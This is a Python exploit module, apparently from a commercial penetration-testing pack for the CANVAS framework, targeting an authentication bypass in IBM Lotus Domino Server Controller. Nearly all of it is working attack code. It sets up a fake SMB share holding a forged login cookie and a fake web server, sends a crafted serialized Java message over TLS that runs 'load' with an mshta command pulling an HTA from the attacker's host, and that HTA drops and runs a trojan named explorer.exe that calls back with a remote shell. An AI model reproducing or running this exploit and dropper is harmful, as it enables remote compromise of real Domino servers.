#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2011
#

import os
import getopt
import sys
import socket
import time
import struct
import canvasengine
import threading
import thread

if '.' not in sys.path:
	sys.path.append('.')

from exploitutils import *
from tcpexploit import tcpexploit
from threading import Thread
from libs.spkproxy import header, body
from libs.canvasos import *
from libs.tlslite.api import *
import libs.spkproxy as spkproxy
import libs.newsmb.libsmb as libsmb

# GUI info
NAME = "IBM Lotus Domino Server Controller Authentication Bypass Vulnerability"
DESCRIPTION = "Authentication bypass vulnerability in IBM Lotus Domino Server Controller"
VERSION = "0.1"

DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "IBM"
DOCUMENTATION["Date public"] = "2011.03.22"
DOCUMENTATION["VersionsAffected"] = "IBM Lotus Domino Server"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-11-110/"
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"
DOCUMENTATION["Notes"] = ""

GTK2_DIALOG = "dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
NOTES="""
"""

CHANGELOG="""
"""


class smbServerThread(Thread):

    def __init__(self, exploit):
        Thread.__init__(self)
        self.exploit = exploit
        self.suicide = False

        return

    def run(self):
        self.exploit.log("Starting SMB server")
	SHARES = {u'D2' : os.getcwd() + u'/3rdparty/D2SEC/exploits/d2sec_jconsole/d2'}
	
	self.exploit.smblock.acquire()
        self.exploit.smbinit = 1
        self.exploit.smblock.release()

   	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		server = libsmb.SMBServer(s)
		for k,v in SHARES.items():
		    server.add_share(k, v)
		
		server.listen()
		while 1:
			try:
				while server.accept() == True:
				    pass
			except  SMBServerException:
				continue
	except Exception, ex:
        	import traceback
	        traceback.print_exc()
        	server.shutdown()


class theexploit(tcpexploit):

    def __init__(self):
        tcpexploit.__init__(self)
        self.name = NAME
        self.port = 2050
        self.user = ""
	self.cmd = ""
	self.trojanname = "index.hta"
	self.exploitpath = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_jconsole/"
        self.connectionList = []
        self.threads = []
        return

    def getArgs(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))
        self.user = self.argsDict.get("user", self.user)
	self.cmd = self.argsDict.get("cmd", self.cmd)

	if (self.cmd == ""):		
		self.cmd = "mshta.exe http://" + self.callback.ip + "/" + self.trojanname		

        return

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]    

    def file4hta(self, exename):
	evilprog = "explorer.exe"
	e = []

	for a in exename:
		for b in a:
			if b == "\r":
				d = "0d"
			elif b == "\n":
				d = "0a"
			elif b == "\0":
				d = "00"
			else:
				c = hex(ord(b))
				d = c.replace("0x", "")

			if len(d) == 1:
				d = "0"+d

			e.append(d)

	i = 0
	j = 0
	l = len(e)

	hta = "<SCRIPT language=vbs>\n\n"

	while 1:
		hta += " prog = prog & \""

		while i != 24:
			hta += "%s," % e[j]
		
			if j == l-1:
				break
			
			i += 1
			j += 1

		if j == l-1:
			hta = hta[:-1] + "\"\n\n"
			break
		
		hta += "\"\n"
		i = 0

	hta += " tmp = Split(prog, \",\")\n"	
	hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
	hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
	hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
	hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
	hta += " Set f = fso.CreateTextFile(path, True)\n\n"
	hta += " For i = 0 To UBound(tmp)\n"
	hta += "   prog = Int(\"&H\" & tmp(i))\n"
	hta += "   f.Write Chr(prog)\n"
	hta += " Next\n\n"
	hta += " f.Close\n"
	hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
	hta += " self.Close\n"
	hta += "</SCRIPT>\n"

	return hta
 
    def maketrojan(self):    	
	t_os = canvasos("Windows")
	t_os.arch = "X86"
    
	self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)        
	self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))        
	self.htafile = self.file4hta(self.mosdeftrojan)
	file(self.trojanname, "wb").write(self.htafile)
	self.setInfo("%s - done"%(NAME))
	ret = len(self.mosdeftrojan) != 0	

	return ret

    def makefile(self):
        html = """
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link href="cssBase?ReadForm" rel="stylesheet" type="text/css">
<script language="JavaScript" type="text/javascript">
	var hWin = parent.hApp.aPanel.serverstatus.hLiveConsole;
	function onLoadConsole()					{hWin.onLiveConsoleIsLoaded()};
	function onErrorConsoleLogin(hError)		{hWin.onErrorConsoleLogin(String(hError))};
	function onErrorConsoleNetwork(hError)		{hWin.onErrorConsoleNetwork(String(hError))};
	function onErrorConsoleController(hError)	{hWin.onErrorConsoleController(String(hError))};
	function onErrorConsoleOther(hError)		{hWin.onErrorConsoleOther(String(hError))};
	function onFilterPanel(hState)			{hWin.onFilterPanel(String(hState))};
</script>
</head>
<body leftmargin=0 topmargin=0 marginwidth=0 marginheight=0>
<table border=1 width=100% height=100% cellpadding=0 cellspacing=0>
<tr height=85%>    
<td>    
<applet
	name				= "DominoConsole"
	code				= "lotus.domino.console.DominoConsoleApplet.class"
	codebase			= "http://TARGETHOST/domjava"
	archive			= "dconsole.jar"
	width			= "100%"
	height			= "99%"
	mayscript
>
<param name = "cache_archive"		value="dconsole.jar">
<param name = "labelfontname"		value="MS Sans Serif">
<param name = "labelfontsize"		value="11">
<param name = "consolefontname"	value="Courier">
<param name = "consolefontsize"	value="12">
<param name = "debug"			value="true">
<param name = "port"			value="2050">
<param name = "username"		value="Admin admin/TEST">
<param name = "useraddress"		value="LOCALIP">
<param name = "cookiefile"		value="\\\\LOCALIP\d2\webadmin.xml">
<param name = "cookievalue"		value="(Gbl5vU2k+ngZ89Kb7TFP)">
<param name = "autoconnect"		value="true">
</applet>
</td>
</tr>
<tr>
<td>
<font color=red> You can execute a remote command with: load <i>[cmd]</i> </font><br>
<font color=red> [Launch calc.exe] load calc.exe</font><br>
<font color=red> [Get a remote MOSDEF node] load TARGETCMD</font>
</td>    
</tr>   
</body>
</html>        
        """
        
        html = html.replace("TARGETHOST", self.host)
        html = html.replace("LOCALIP", self.callback.ip)
        html = html.replace("TARGETCMD", self.cmd)
        
        return html       
    
    def makesploit(self, clientheader, clientbody):        
        from libs.spkproxy import header, body
        h = header('SERVER')
        b = body()	

	self.maketrojan()
	        
        if clientheader.URL.count("jconsole"):
            self.log("Sending HTML page")
            sploitstring = self.makefile()
            self.log("Sending %d bytes"%len(sploitstring))
            h.addHeader("Connection","close")
            b.setBody(sploitstring)
	elif clientheader.URL.count(self.trojanname):
		self.log("Sending MOSDEF trojan")
		f = open(self.trojanname, "rb")
		sploitstring = f.read()
		f.close()
		os.remove(self.trojanname)
		self.log("Sending %d bytes"%len(sploitstring))
		h.addHeader("Content-type","binary/octet-stream")
		h.addHeader("Connection","close")
		b.setBody(sploitstring)
	
        return h, b	

    #################################################################################################################
    # Code from httpserver.py
    def listen(self):
	self.getargs()
	s=self.gettcplistener(80, "0.0.0.0")
	
	if not s:
		if self.port < 1024:
		    self.log("Cannot listen on port %d - perhaps we need to be root or that port is already bound? " \
		             "you can try to bind to a higher port" % self.port)
		else:
		    self.log("Cannot listen on port %d - perhaps that port is already bound?" % self.port)
		return 0
	s.set_timeout(5)
	self.s=s
	return s 
	
    def accept(self, s=None ):
	"""
	Try to accept one connection
	returns true if we found one
	"""
	#we loop on this ,so no annoying printouts here
	#self.log("Accepting connection")
	if s==None:
		s=self.s 
	try:
		infd,addr=s.accept()
	except timeoutsocket.Timeout:
		#self.log("Timed out - no accept yet")
		return 
	if infd==-1:
		return
	
	#else we have an infd
	self.handle(infd)
	return True #handled connection
	    
    def handle(self, infd): 
	self.log("Handling connection")
	clientheader = header(state = "SERVER")
	clientheader.ssl = self.ssl
	ret = clientheader.readdata(infd)
	clientbody = body()
	
	if clientheader.gotGoodHeader():
		if clientheader.bodySize()>0 or clientheader.wasChunked:
			self.log("Reading body")
			clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
			self.log("Read body")
	
	self.log("Creating exploit response")		
	servheader,servbody = self.makesploit(clientheader,clientbody)
			
	self.log("Responding")		
	bodydata = "".join(servbody.data)		            		
	response = ""
	response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)		
	self.log(response)
	
	for akey in servheader.headerValuesDict.keys():
		if akey not in [ "Content-Length", "Content-length"]:
			response += servheader.grabHeader(akey)
			
	self.log("Sending header data of %d bytes"%len(response))
	chunked = 0
	
	if not chunked:
		response += "Content-Length: "+str(len(bodydata))+"\r\n"
		
	response += "\r\n"
	response += "".join(bodydata)
	self.log("Total response length is %d bytes"%len(response))
	
	try:
		infd.sendall(response)
	except socket.error:
		self.log("Connection closed by peer")
		
	self.log("Response sent")
	infd.close() #connection close - later on we'll keep it.
	return 
    #
    #################################################################################################################
        
    def startHTTPServer(self):
	s = self.listen()
	
	if not s:
		self.log("Failed to listen - not running")
		return 0
		
	while 1:
		if self.state==self.HALT:
			self.s.close()
			break
		self.accept()
	
	self.setInfo("%s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))		
	return 1
    	        
    def run(self):
        self.setInfo("%s attacking %s:%d - (in progress)" % (self.name, self.host, self.port), showlog=True)
	
        # Check arguments and start fake web server for TROJANMODE
        self.getArgs()

	# Create webadmin.xml for the fake share		
        xml = ""
        xml += "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"        
        xml += "<logins version='1' lastmodified='20110324T161430,00+01'><user name='TARGETUSER' cookie='(Gbl5vU2k+ngZ89Kb7TFP)' address='LOCALIP' useragent='Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; (R1 1.6); .NET CLR 2.0.50727)' lastmodified='20110324T161430,00+01'/></logins>"  
        
        xml = xml.replace("TARGETUSER", self.user)      
        xml = xml.replace("LOCALIP", self.callback.ip)

	if not os.path.exists(self.exploitpath + "d2"):
		os.mkdir(self.exploitpath + "d2")

	f = open(self.exploitpath + "d2/webadmin.xml", "w")
	f.write(xml)
	f.close()       	

        # Start fake SMB server
        self.smblock = threading.Lock()
        self.smbinit = 0
        t = smbServerThread(self)
        t.start()
        self.threads += [t]
        time.sleep(1)
        self.smblock.acquire()

        if self.smbinit != 1:
            self.state = self.HALT
            self.log("Could not listen on port 445. You should be running as root!")
            return 0

        self.smblock.release()                

	# Start HTTP server
        thread.start_new_thread(self.startHTTPServer,())

	self.log("You can freely access to the remote console: http://%s/jconsole" % self.callback.ip)

	# Exect command	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((self.host, self.port))
	
	ssl_sock = TLSConnection(s)
	ssl_sock.handshakeClientCert()

	data = "#APPLET\n#COOKIEFILE \\\\LOCALIP\d2\webadmin.xml\n#USERADDRESS TARGETIP\n#UI TARGETUSER,(Gbl5vU2k+ngZ89Kb7TFP)\n"
	data = data.replace("LOCALIP", self.callback.ip)
	data = data.replace("TARGETIP", self.callback.ip)
	data = data.replace("TARGETUSER", self.user)
	ssl_sock.write(data)
	buff= ssl_sock.read()

	data  = "#ST\n"
	ssl_sock.write(data)
	buff= ssl_sock.read()

	data  = "#CNTR\n"
	ssl_sock.write(data)
	buff= ssl_sock.read()

	data  = "#VERSION 2.0\n"
	ssl_sock.write(data)
	buff= ssl_sock.read()

	data  = "#CHKACCESS\n"
	ssl_sock.write(data)
	buff= ssl_sock.read()

	data  = "#EXIT\n"
	ssl_sock.write(data)
	buff= ssl_sock.read()
	
	data = "\xac\xed\x00\x05"
	ssl_sock.write(data)

	cmd = "load " + self.cmd + "\n"
	buff = struct.pack(">B", len(cmd)) + cmd
	data = "\x73\x72\x00\x24\x6c\x6f\x74\x75\x73\x2e\x64\x6f\x6d\x69\x6e\x6f\x2e\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x42\x69\x6e\x61\x72\x79\x4d\x73\x67\x46\x6f\x72\x6d\x61\x74\x3c\x2c\x0a\xe7\xfe\x9a\x3a\xc6\x03\x00\x02\x5b\x00\x05\x62\x64\x61\x74\x61\x74\x00\x02\x5b\x42\x4c\x00\x07\x73\x76\x63\x6e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78\x72\x00\x1e\x6c\x6f\x74\x75\x73\x2e\x64\x6f\x6d\x69\x6e\x6f\x2e\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x4d\x73\x67\x46\x6f\x72\x6d\x61\x74\x11\xa6\x23\x6b\xda\xfb\x95\x19\x03\x00\x06\x49\x00\x06\x6c\x65\x6e\x67\x74\x68\x49\x00\x07\x6d\x73\x67\x54\x79\x70\x65\x4c\x00\x09\x63\x6f\x6e\x73\x6f\x6c\x65\x49\x64\x71\x00\x7e\x00\x02\x4c\x00\x04\x64\x61\x74\x61\x71\x00\x7e\x00\x02\x4c\x00\x06\x6d\x73\x67\x46\x6d\x74\x71\x00\x7e\x00\x02\x4c\x00\x08\x72\x65\x76\x69\x73\x69\x6f\x6e\x71\x00\x7e\x00\x02\x78\x70\x00\x00\x00\x0d\x00\x00\x00\x01\x74\x00\x04\x74\x65\x73\x74\x74\x00" + buff +  "\x74\x00\x06\x4e\x6f\x72\x6d\x61\x6c\x74\x00\x06\x4a\x53\x43\x31\x2e\x30\x74\x00\x0b\x4a\x61\x76\x61\x43\x6f\x6e\x73\x6f\x6c\x65\x78\x70\x70\x78\x79"
	ssl_sock.write(data)

	ssl_sock.close()
	
	# Check thread
        for t in self.threads:
            t.join(120)

        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
            self.log("%s done (succeeded!)" % (self.name))
            return 1

        self.setInfo("%s attacking %s:%d (failed)" % (self.name, self.host, self.port), showlog=True)
        self.log("%s done (failed)" % (self.name))

        return 0

    def usage(self):
        print "Usage: %s -t host -l localIP -d localPort" % (sys.argv[0])
    

if __name__=='__main__':
 	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
	app = theexploit()
	ret = standard_callback_commandline(app)

